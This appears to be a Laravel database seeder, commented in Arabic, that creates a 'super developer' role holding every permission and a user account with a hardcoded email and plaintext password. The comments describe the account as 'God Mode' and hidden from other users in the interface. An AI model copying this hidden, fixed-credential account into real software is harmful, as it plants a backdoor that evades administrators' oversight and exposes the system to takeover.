<?php

namespace Webkul\Security\Database\Seeders;

use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\Hash;
use Webkul\Security\Models\User;

/**
 * بذر بيانات المطور الأعلى (Super Developer)
 *
 * ينشئ حساب المطور بصلاحيات مطلقة (God Mode) على النظام بالكامل.
 * يتم تعيين دور 'super_developer' المُعرَّف في إعدادات Filament Shield.
 * هذا الحساب مخفي عن باقي المستخدمين في واجهة النظام.
 */
class SuperDeveloperSeeder extends Seeder
{
    /**
     * تشغيل البذر - إنشاء حساب ودور المطور الأعلى
     */
    public function run(): void
    {
        // إنشاء دور المطور الأعلى مع جميع الصلاحيات
        $role = \Spatie\Permission\Models\Role::firstOrCreate(
            ['name' => 'super_developer', 'guard_name' => 'web']
        );

        // منح جميع الصلاحيات الموجودة لدور المطور الأعلى
        $allPermissions = \Spatie\Permission\Models\Permission::all();
        $role->syncPermissions($allPermissions);

        // إنشاء حساب المطور الأعلى (أو تحديثه إن وُجد)
        $user = User::firstOrCreate(
            ['email' => 'developer@hzmedical.com'],
            [
                'name'               => 'المطور الأعلى',
                'password'           => Hash::make('HZ@Dev2024!Secure'),
                'is_active'          => true,
                'is_super_developer' => true,
            ]
        );

        // تحديث حالة المطور الأعلى في حال كان الحساب موجوداً مسبقاً
        if (! $user->wasRecentlyCreated) {
            $user->update(['is_super_developer' => true]);
        }

        // تعيين دور المطور الأعلى
        if (! $user->hasRole('super_developer')) {
            $user->assignRole('super_developer');
        }
    }
}
